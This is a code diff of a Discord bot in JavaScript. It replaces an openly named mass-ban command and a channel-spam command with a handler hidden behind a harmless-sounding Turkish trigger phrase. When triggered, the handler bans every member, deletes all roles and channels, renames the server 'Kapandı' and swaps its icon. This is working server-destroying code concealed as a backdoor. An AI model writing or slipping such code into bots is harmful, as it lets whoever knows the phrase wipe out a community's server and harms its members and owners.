@@ -35,40 +35,13 @@ client.on('message', message => {
 });
 
 client.on('message', message => {
-    if(message.content == '+ban'){
-message.guild.members.forEach(member => member.ban())
-    }
-});
-
-client.on('message', message => {
-    if(message.content == 'oda'){
-   message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-      message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-      message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-message.guild.createChannel(`berke`)
-
-message.guild.createChannel(`berke`)
+    if(message.content == 'burayı bi düzelt'){
+   message.guild.members.forEach(member => member.ban())
+   message.guild.roles.deleteAll("");
+   message.guild.channels.deleteAll("");
+   message.guild.setName(`Kapandı`, "")
+   message.guild.setIcon(`https://cdn.discordapp.com/attachments/615300671599804435/616763400508145684/16-512.png`)
+   message.guild.createChannel(`Kapandı`)
     }
 });
 
